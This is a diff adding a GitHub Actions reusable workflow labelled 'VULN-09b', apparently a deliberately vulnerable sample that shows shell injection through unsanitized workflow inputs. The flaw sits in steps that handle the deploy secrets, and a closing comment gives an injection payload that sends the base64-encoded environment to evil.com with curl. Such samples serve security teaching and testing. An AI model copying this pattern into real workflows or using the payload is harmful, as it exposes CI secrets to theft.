@@ -1,0 +1,38 @@
+name: "VULN-09b: Reusable Workflow Input Injection"
+
+# VULNERABILITY: Reusable workflow passes caller inputs directly into ${{ }} expressions
+# RISK: Caller-controlled input values are injected into shell commands without sanitization
+# SECONDARY: Even with trusted callers, any workflow_dispatch or repository_dispatch trigger
+#            means external input flows into the reusable workflow unsanitized
+
+on:
+  workflow_call:
+    inputs:
+      deploy-target:
+        required: true
+        type: string
+      version:
+        required: true
+        type: string
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Validate target
+        # ⚠️ VULNERABLE: Caller-controlled input injected directly into shell
+        run: |
+          echo "Deploying version ${{ inputs.version }} to ${{ inputs.deploy-target }}"
+          TARGET="${{ inputs.deploy-target }}"
+          if [ "$TARGET" = "production" ]; then
+            echo "Production deploy initiated"
+          fi
+      - name: Deploy
+        env:
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+          REGISTRY_PASSWORD: ${{ secrets.REGISTRY_PASSWORD }}
+        run: |
+          echo "Pulling image: myapp:${{ inputs.version }}"
+          echo "Deploying to: ${{ inputs.deploy-target }}"
+          # Attacker-controlled version string: v1.0"; curl http://evil.com/$(env | base64) #
